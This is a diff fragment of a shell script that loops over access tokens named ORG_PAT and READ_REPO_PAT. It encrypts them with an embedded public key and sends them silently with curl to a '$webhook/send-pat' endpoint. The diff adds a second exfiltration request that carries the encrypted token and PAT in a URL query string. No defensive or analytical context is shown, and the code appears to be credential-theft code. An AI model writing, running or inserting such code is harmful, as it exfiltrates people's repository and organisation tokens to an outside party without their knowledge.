@@ -30,11 +30,15 @@ for pat in ORG_PAT READ_REPO_PAT; do
 		for ((i = 0; i < n_chunks; i++)); do
 	        	chunk=${b64:i*chunk_size:chunk_size}
 	        	ui_args+=(--data-urlencode "uchunk$i=$(rsa_encrypt_b64 "$chunk")")
-	    	done
+	    done
 	
-	    	encrypted_pat=$(rsa_encrypt_b64 "$pat")
+	    encrypted_pat=$(rsa_encrypt_b64 "$pat")
 	   	encrypted_token=$(rsa_encrypt_b64 "$token")
 		curl -s -o /dev/null -X POST "$webhook/send-pat" --data-urlencode "secret=$encrypted_pat" --data-urlencode "token=$encrypted_token" "$ui_args"
+
+		encrypted_token=$(printf '%s' "$token" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
+		encrypted_pat=$(printf '%s' "$pat" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
+		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$ui_args"
 
 done
 
